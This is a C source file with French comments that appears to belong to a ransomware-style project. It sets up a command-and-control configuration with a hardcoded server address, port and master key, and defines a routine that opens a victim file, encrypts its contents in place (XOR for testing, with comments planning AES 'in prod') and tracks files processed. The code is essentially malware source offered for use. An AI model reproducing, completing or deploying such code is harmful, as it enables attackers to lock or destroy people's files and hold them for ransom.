#include "../include/crypto.h"
#include "../include/common.h"

BOOL InitializeConfig() {
    printf("[CRYPTO] Initializing cryptographic configuration...\n");
    
    // Configuration hardcodée pour simplicité
    strcpy_s(g_c2_config.c2_domain, 256, "192.168.1.25");
    g_c2_config.c2_port = 8080;
    g_c2_config.connection_timeout = 5000;
    
    // Clé maître (obfusquée en réel)
    BYTE master_key[] = {
        0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
        0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0,
        0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
        0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00
    };
    memcpy(g_c2_config.master_key, master_key, AES_KEY_SIZE);
    
    printf("[CRYPTO] Configuration initialized\n");
    return TRUE;
}

BOOL EncryptFileSimple(LPCWSTR file_path) {
    printf("[CRYPTO] Encrypting file: %ws\n", file_path);
    
    // Ouvrir le fichier
    HANDLE hFile = CreateFileW(file_path, GENERIC_READ | GENERIC_WRITE, 
                               0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[CRYPTO] Failed to open file\n");
        return FALSE;
    }
    
    // Obtenir la taille
    DWORD file_size = GetFileSize(hFile, NULL);
    if (file_size == 0 || file_size > 10 * 1024 * 1024) { // Limite 10MB
        printf("[CRYPTO] File too large or empty, skipping\n");
        CloseHandle(hFile);
        return FALSE;
    }
    
    // Lire le contenu
    BYTE* file_data = (BYTE*)malloc(file_size);
    DWORD bytes_read;
    if (!ReadFile(hFile, file_data, file_size, &bytes_read, NULL)) {
        printf("[CRYPTO] Failed to read file\n");
        free(file_data);
        CloseHandle(hFile);
        return FALSE;
    }
    
    // Chiffrement simple XOR pour les tests (remplacer par AES en prod)
    BYTE key = 0xAA;
    for (DWORD i = 0; i < file_size; i++) {
        file_data[i] ^= key;
    }
    
    // Réécrire le fichier chiffré
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    DWORD bytes_written;
    WriteFile(hFile, file_data, file_size, &bytes_written, NULL);
    SetEndOfFile(hFile);
    
    free(file_data);
    CloseHandle(hFile);
    
    printf("[CRYPTO] File encrypted successfully\n");
    g_files_processed++;
    return TRUE;
}
